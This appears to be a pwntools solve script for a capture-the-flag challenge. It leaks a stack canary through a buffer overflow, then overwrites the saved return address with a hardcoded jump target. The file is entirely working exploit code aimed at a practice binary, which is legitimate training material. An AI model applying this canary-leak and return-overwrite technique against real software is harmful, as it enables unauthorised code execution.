from pwn import *

proc = remote('localhost', 5000) # Running on local machine
# proc = remote('chall.lac.tf', 31123) # Connection to infra

# Leaking the canary
proc.recvline()
leak_canary_payload = ('A'*(64+5)+"i'm").encode()
proc.sendline(leak_canary_payload)
canary = proc.recv(10)[3:]
print("The canary is: ", canary)

# retaddr from gdb
retaddr = b'\xe6\x11\x40' + b'\x00'*5

# Crafting and Delivering the Payload
proc.recvline()
pre_canary_payload = b"bye" + b"\x00" + ('A'*(64-4+8)).encode()
canary = b"\x00" + canary
post_canary_payload = ('A'*8).encode() + retaddr
payload = pre_canary_payload + canary + post_canary_payload
print("The payload is: ", payload)
proc.sendline(payload)

print(proc.recvline())
print(proc.recvline())
